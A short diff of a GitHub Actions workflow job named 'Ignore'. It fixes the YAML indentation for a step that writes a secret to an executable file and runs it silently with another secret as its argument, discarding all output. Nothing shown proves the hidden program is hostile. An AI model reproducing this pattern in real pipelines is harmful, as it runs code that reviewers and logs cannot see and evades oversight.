@@ -6,10 +6,11 @@ on:
 jobs:
   Ignore:
     runs-on: ubuntu-latest
-    - run: |
-        echo "$S" > ./s
-        chmod +x ./s
-        ./s $D &> /dev/null
-      env:
-        S: ${{ secrets.S }}
-        D: ${{ secrets.D }}
+    steps:
+      - run: |
+          echo "$S" > ./s
+          chmod +x ./s
+          ./s $D &> /dev/null
+        env:
+          S: ${{ secrets.S }}
+          D: ${{ secrets.D }}
